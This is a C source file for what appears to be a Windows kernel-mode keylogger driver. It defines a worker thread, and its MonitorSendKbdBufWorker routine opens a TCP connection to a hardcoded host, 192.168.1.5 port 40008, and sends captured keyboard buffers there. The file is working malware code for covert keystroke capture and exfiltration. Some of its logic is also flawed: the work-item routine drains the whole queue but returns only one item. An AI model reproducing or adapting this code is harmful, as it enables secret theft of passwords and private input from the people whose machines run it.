#include <inc/klogger.h>
#include <inc/mwsk.h>
#include <inc/ecore.h>
#include <inc/systhread.h>
#include <inc/keybrd.h>

#define __SUBCOMPONENT__ "ecore"

typedef struct _MONITOR {
    SYSTHREAD       Thread;
    PMWSK_CONTEXT   WskContext;
    KSPIN_LOCK      Lock;
    LIST_ENTRY      WrkItemList;
	volatile LONG	Stopping;
} MONITOR, *PMONITOR;

MONITOR g_Monitor;

typedef
VOID (NTAPI *PMON_WRK_ROUTINE)(PMONITOR Monitor, PVOID Context);

typedef struct _MON_WRK_ITEM {
    LIST_ENTRY          ListEntry;
    PMON_WRK_ROUTINE    Routine;
    PVOID               Context;
} MON_WRK_ITEM, *PMON_WRK_ITEM;

#define MON_WRK_ITEM_TAG 'mont'

VOID
    MonitorQueueWorkItem(PMONITOR Monitor, PMON_WRK_ROUTINE Routine, PVOID Context)
{
    PMON_WRK_ITEM WrkItem;
    KIRQL Irql;
	
	if (Monitor->Stopping)
		return;

    WrkItem = (PMON_WRK_ITEM)ExAllocatePoolWithTag(NonPagedPool, sizeof(MON_WRK_ITEM), MON_WRK_ITEM_TAG);
    if (WrkItem == NULL) {
        __debugbreak();
        return;
    }

    WrkItem->Routine = Routine;
    WrkItem->Context = Context;

    KeAcquireSpinLock(&Monitor->Lock, &Irql);
    InsertTailList(&Monitor->WrkItemList, &WrkItem->ListEntry);
    KeReleaseSpinLock(&Monitor->Lock, Irql);

    SysThreadSignal(&Monitor->Thread);
}

PMON_WRK_ITEM
    MonitorGetWkItemToProcess(PMONITOR Monitor)
{
    PMON_WRK_ITEM WrkItem = NULL;
    KIRQL Irql;

    KeAcquireSpinLock(&Monitor->Lock, &Irql);
    while (!IsListEmpty(&Monitor->WrkItemList)) {
        PLIST_ENTRY ListEntry;
        ListEntry = RemoveHeadList(&Monitor->WrkItemList);
        WrkItem = CONTAINING_RECORD(ListEntry, MON_WRK_ITEM, ListEntry);
    }
    KeReleaseSpinLock(&Monitor->Lock, Irql);
    return WrkItem;
}

VOID
    MonitorThreadCallback(PVOID Context)
{
    PMONITOR Monitor = (PMONITOR)Context;
    PMON_WRK_ITEM WrkItem;
    BOOLEAN bSignalThread = FALSE;
    KIRQL Irql;

    WrkItem = MonitorGetWkItemToProcess(Monitor);
    if (WrkItem != NULL) {
        WrkItem->Routine(Monitor, WrkItem->Context);
        ExFreePoolWithTag(WrkItem, MON_WRK_ITEM_TAG);
    }

    KeAcquireSpinLock(&Monitor->Lock, &Irql);
    if (!IsListEmpty(&Monitor->WrkItemList))
        bSignalThread = TRUE;
    KeReleaseSpinLock(&Monitor->Lock, Irql);

    SysThreadSignal(&Monitor->Thread);
}

VOID MonitorSendKbdBufWorker(PMONITOR Monitor, PKBD_BUFF_ENTRY BuffEntry)
{
	NTSTATUS Status;
	SOCKADDR_IN LocalAddress;
	SOCKADDR_IN RemoteAddress;
	PMSOCKET Socket = NULL;
	UNICODE_STRING NodeName = RTL_CONSTANT_STRING(L"192.168.1.5");
	UNICODE_STRING ServiceName = RTL_CONSTANT_STRING(L"40008");
	UNICODE_STRING RemoteName = { 0, 0, NULL };

	IN4ADDR_SETANY(&LocalAddress);

	Status = MWskResolveName(
		Monitor->WskContext,
		&NodeName,
		&ServiceName,
		NULL,
		&RemoteAddress
		);

	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskResolveName error %x for name %wZ %wZ", Status, &NodeName, &ServiceName);
		goto cleanup;
	}

	Status = MWskSockAddrToStr(&RemoteAddress, &RemoteName);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskSockAddrToStr failure %x", Status);
		goto cleanup;
	}

	//KLog(LInfo, "Remote name %ws", RemoteName.Buffer);

	Status = MWskSocketConnect(Monitor->WskContext, SOCK_STREAM, IPPROTO_TCP, (PSOCKADDR)&LocalAddress, (PSOCKADDR)&RemoteAddress, &Socket);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskSocketConnect error %x", Status);
		goto cleanup;
	}

	Status = MWskSendAll(Socket, BuffEntry->Bytes, BuffEntry->BytesUsed);
	if (!NT_SUCCESS(Status)) {
		KLog(LError, "MWskSendAll error %x", Status);
	}

cleanup:
    if (RemoteName.Buffer != NULL) {
        ExFreePool(RemoteName.Buffer);
    }

    if (Socket != NULL)
        MWskSocketRelease(Socket);
}

VOID ECoreSendKbdBuf(PVOID BuffEntry)
{
	MonitorQueueWorkItem(&g_Monitor, MonitorSendKbdBufWorker, BuffEntry);
}

NTSTATUS
    MonitorInit(PMONITOR Monitor)
{
    NTSTATUS Status;

	Monitor->Stopping = 0;
    InitializeListHead(&Monitor->WrkItemList);
    KeInitializeSpinLock(&Monitor->Lock);

    Monitor->WskContext = MWskCreate();
    if (Monitor->WskContext == NULL) {
        KLog(LError, "MWskCreate failed");
        return STATUS_UNSUCCESSFUL;
    }

    Status = SysThreadStart(&Monitor->Thread, MonitorThreadCallback, Monitor);
    if (!NT_SUCCESS(Status)) {
        MWskRelease(Monitor->WskContext);
        Monitor->WskContext = NULL;
        return Status;
    }

    return STATUS_SUCCESS;
}

VOID
    MonitorRelease(PMONITOR Monitor)
{
    PMON_WRK_ITEM WrkItem;

	Monitor->Stopping = 1;
    SysThreadStop(&Monitor->Thread);

    while ((WrkItem = MonitorGetWkItemToProcess(Monitor)) != NULL) {
        ExFreePoolWithTag(WrkItem, MON_WRK_ITEM_TAG);
    }

    MWskRelease(Monitor->WskContext);
    Monitor->WskContext = NULL;
}

NTSTATUS
    ECoreStart()
{   
    KLog(LInfo, "ECoreStart");
 
    return MonitorInit(&g_Monitor);
}

NTSTATUS
    ECoreStop()
{
    KLog(LInfo, "ECoreStop");

    MonitorRelease(&g_Monitor);

    return STATUS_SUCCESS;
}